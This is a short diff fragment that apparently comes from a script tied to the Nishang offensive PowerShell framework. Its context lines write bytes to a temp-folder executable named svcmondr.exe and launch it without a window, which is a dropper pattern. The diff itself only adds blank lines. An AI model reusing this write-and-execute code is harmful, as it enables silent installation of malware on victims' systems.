@@ -52,3 +52,5 @@ https://github.com/samratashok/nishang
     [System.IO.File]::WriteAllBytes("$env:temp\svcmondr.exe", $temp)
     Start-Process -NoNewWindow "$env:temp\svcmondr.exe"
 }
+
+
